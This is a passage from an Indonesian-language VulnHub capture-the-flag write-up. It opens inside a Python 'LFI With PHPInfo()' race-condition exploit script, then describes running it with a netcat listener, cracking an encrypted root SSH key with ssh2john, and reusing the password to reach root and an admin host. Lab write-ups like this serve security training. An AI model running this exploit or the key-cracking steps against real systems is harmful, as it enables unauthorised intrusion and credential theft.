        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="s">""</span><span class="p">:</span>
            <span class="k">break</span>
        <span class="c1"># detect the final chunk
</span>        <span class="k">if</span> <span class="n">i</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">"0</span><span class="se">\r\n\r\n</span><span class="s">"</span><span class="p">):</span>
            <span class="k">break</span>
    <span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">i</span> <span class="o">=</span> <span class="n">d</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"[tmp_name] =&amp;gt"</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
        <span class="k">raise</span> <span class="nb">ValueError</span><span class="p">(</span><span class="s">"No php tmp_name in phpinfo output"</span><span class="p">)</span>
    
    <span class="k">print</span> <span class="s">"found %s at %i"</span> <span class="o">%</span> <span class="p">(</span><span class="n">d</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">10</span><span class="p">],</span><span class="n">i</span><span class="p">)</span>
    <span class="c1"># padded up a bit
</span>    <span class="k">return</span> <span class="n">i</span><span class="o">+</span><span class="mi">256</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    
    <span class="k">print</span> <span class="s">"LFI With PHPInfo()"</span>
    <span class="k">print</span> <span class="s">"-="</span> <span class="o">*</span> <span class="mi">30</span>

    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">"Usage: %s host [port] [threads]"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">host</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">gethostbyname</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
    <span class="k">except</span> <span class="n">socket</span><span class="p">.</span><span class="n">error</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">"Error with hostname %s: %s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">e</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="n">port</span><span class="o">=</span><span class="mi">80</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="k">except</span> <span class="nb">IndexError</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">except</span> <span class="nb">ValueError</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">"Error with port %d: %s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">e</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    
    <span class="n">poolsz</span><span class="o">=</span><span class="mi">10</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">poolsz</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span>
    <span class="k">except</span> <span class="nb">IndexError</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">except</span> <span class="nb">ValueError</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">"Error with poolsz %d: %s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="n">e</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="k">print</span> <span class="s">"Getting initial offset..."</span><span class="p">,</span>  
    <span class="n">reqphp</span><span class="p">,</span> <span class="n">tag</span><span class="p">,</span> <span class="n">reqlfi</span> <span class="o">=</span> <span class="n">setup</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="n">getOffset</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">reqphp</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>

    <span class="n">maxattempts</span> <span class="o">=</span> <span class="mi">2000</span>
    <span class="n">e</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Event</span><span class="p">()</span>
    <span class="n">l</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Lock</span><span class="p">()</span>

    <span class="k">print</span> <span class="s">"Spawning worker pool (%d)..."</span> <span class="o">%</span> <span class="n">poolsz</span>
    <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>

    <span class="n">tp</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">poolsz</span><span class="p">):</span>
        <span class="n">tp</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">ThreadWorker</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">l</span><span class="p">,</span><span class="n">maxattempts</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">reqphp</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">reqlfi</span><span class="p">,</span> <span class="n">tag</span><span class="p">))</span>

    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">tp</span><span class="p">:</span>
        <span class="n">t</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">while</span> <span class="ow">not</span> <span class="n">e</span><span class="p">.</span><span class="n">wait</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
            <span class="k">if</span> <span class="n">e</span><span class="p">.</span><span class="n">is_set</span><span class="p">():</span>
                <span class="k">break</span>
            <span class="k">with</span> <span class="n">l</span><span class="p">:</span>
                <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">write</span><span class="p">(</span> <span class="s">"</span><span class="se">\r</span><span class="s">% 4d / % 4d"</span> <span class="o">%</span> <span class="p">(</span><span class="n">counter</span><span class="p">,</span> <span class="n">maxattempts</span><span class="p">))</span>
                <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
                <span class="k">if</span> <span class="n">counter</span> <span class="o">&gt;=</span> <span class="n">maxattempts</span><span class="p">:</span>
                    <span class="k">break</span>
        <span class="k">print</span>
        <span class="k">if</span> <span class="n">e</span><span class="p">.</span><span class="n">is_set</span><span class="p">():</span>
            <span class="k">print</span> <span class="s">"Woot!  \m/"</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span> <span class="s">":("</span>
    <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">Telling threads to shutdown..."</span>
        <span class="n">e</span><span class="p">.</span><span class="nb">set</span><span class="p">()</span>
    
    <span class="k">print</span> <span class="s">"Shuttin' down..."</span>
    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">tp</span><span class="p">:</span>
        <span class="n">t</span><span class="p">.</span><span class="n">join</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div></div>
<p>dan ya, setelah itu saya jalankan exploitnya seperti ini, <code class="language-plaintext highlighter-rouge">python exploit.py 192.168.59.129 80 10</code> dan jangan lupa jalankan juga <code class="language-plaintext highlighter-rouge">netcat</code> agar saling terhubung satu sama lain.</p>
<p align="left">
<img src="https://i.postimg.cc/CKrym2jS/gyazo.png" />
</p>

<h1 id="getting-flag">Getting Flag</h1>

<h2 id="1st-flag">1st Flag</h2>
<p>pergi ke tempat directory asal dimana web itu dibuat <code class="language-plaintext highlighter-rouge">/var/www/html/</code> and boom, we got the flag (.user.txt).</p>
<p align="left">
	<img src="https://i.gyazo.com/ab9d713f766b4f6db7fb7fec4e323ee8.png" />
</p>

<h2 id="2nd-flag">2nd Flag</h2>
<p>flag yang kedua, oke kembali ke direct paling awal <code class="language-plaintext highlighter-rouge">/</code> setelah itu saya ketik command <code class="language-plaintext highlighter-rouge">ls -la</code> untuk melihat semua file/folder yang ada. and then saya menjumpai sebuah file <code class="language-plaintext highlighter-rouge">.oldkeys.tgz</code>, karena curiga saya coba buka di folder <code class="language-plaintext highlighter-rouge">/tmp</code>. saya extract dengan command <code class="language-plaintext highlighter-rouge">tar -xzf .oldkeys.tgz</code> dan menemukan sebuah file yang bernama <code class="language-plaintext highlighter-rouge">root</code>. nah itulah tujuan saya hiyahiya langsung dpt aja. setelah saya buka ternyata berisikan <code class="language-plaintext highlighter-rouge">ssh</code> yang terenkripsi.</p>
<p align="left">
	<img src="https://i.gyazo.com/544c8fed461556f974edd4a3dc78bdf0.png" />
</p>

<p>karena merepotkan saya coba untuk menggunakan <code class="language-plaintext highlighter-rouge">ssh2john.py</code> sebagai alat yang pandai dalam mengecrack sebuah string yang terenkripsi.</p>
<p align="left">
	<img src="https://i.gyazo.com/a1d8c867e8753fed716aeb348d04f8db.png" />
</p>
<p align="left">
	<img src="https://i.gyazo.com/e82c0fba38ef10d300be2f012ad3c8eb.png" />
</p>

<p>dan boom, password sudah terpecahkan. mari kita login dengan user <code class="language-plaintext highlighter-rouge">root</code> access. 
<code class="language-plaintext highlighter-rouge">su -P root</code>, lalu masukkan password tadi.</p>
<p align="left">
	<img src="https://i.gyazo.com/5017165b1ec3978eac08f67003fdacce.png" />
</p>

<p>we got the 2nd flag.</p>

<h2 id="3rd-flag">3rd Flag</h2>

<p>saya kira udah selesai ternyata belom pas saya iseng nyari” sesuatu yang bisa disebut dengan easter egg. taunya malah nemu file <code class="language-plaintext highlighter-rouge">.ssh</code> lengkap dengan <code class="language-plaintext highlighter-rouge">id_rsa</code> &amp; <code class="language-plaintext highlighter-rouge">id_rsa.pub</code>. wah curiga apakah ada user lainnya atau bagaimana? saya juga tak paham waktu itu, lalu saya buka <code class="language-plaintext highlighter-rouge">id_rsa.pub</code> dan muncullah <code class="language-plaintext highlighter-rouge">admin@192.168.150.1</code>. Saya kaget dan batin “loh masih ada lagi toh? kirain dah selesai”.
lalu saya masuk menggunakan ssh dengan user <code class="language-plaintext highlighter-rouge">admin</code> yang tertulis.
<code class="language-plaintext highlighter-rouge">ssh admin@192.168.150.1</code> bingung nyari passwordnya gimana, udah 5 menit lebih nyari g ada yang ketemu terus kepikiran coba pake password yang tadi aja.
eh kntl ternyata bisa wkekekek.</p>
<p align="left">
	<img src="https://i.gyazo.com/1c61353f7943560fb40cd69c442c63b9.png" />
</p>

<h2 id="4th-flag">4th Flag</h2>

<p align="left">
	<img src="https://i.gyazo.com/c56663abb5770757eec738f5bfce25d4.png" />
</p>
<p align="left">
	<img src="https://i.gyazo.com/cf316cdd621671dd4bbf860c0580a4dd.png" />
</p>


  </div>
  <div class="post-info" style="padding-top: 25px">
    <div class="post-date">
      2020-06-29.
    </div>
    <div class="post-categories">
      <span></span>
      
      <a href="/category/vulnhub" class="post-category">vulnhub</a>
      
    </div>
    <div class="post-tags">
      <span></span>
      
      <a href="/tag/lfi" class="post-tag">LFI</a>
      
      <a href="/tag/rce" class="post-tag">RCE</a>
      
    </div>
    <div class="post-tools">
      
      <div>
        <span></span><a href="/2020/07/12/vh-presidential">VulnHub - Presidential: 1</a>
      </div>
      
      
      <div>
        <span></span><a href="/2020/06/01/selamat-datang">Selamat datang</a>
      </div>
      
    </div>
    
  </div>
</article>

    </main>
    <footer class="container-footer">
      <div class="footer-copyright">
  <span class="footer-copyright-text float-left">Copyright &copy; 2022.  sharpicx.</span>
  <span class="footer-copyright-text float-right">
    Powered by <a href="https://jekyllrb.com/">Jekyll</a>
  </span>
</div>

    </footer>
  </div>
</body>
</html>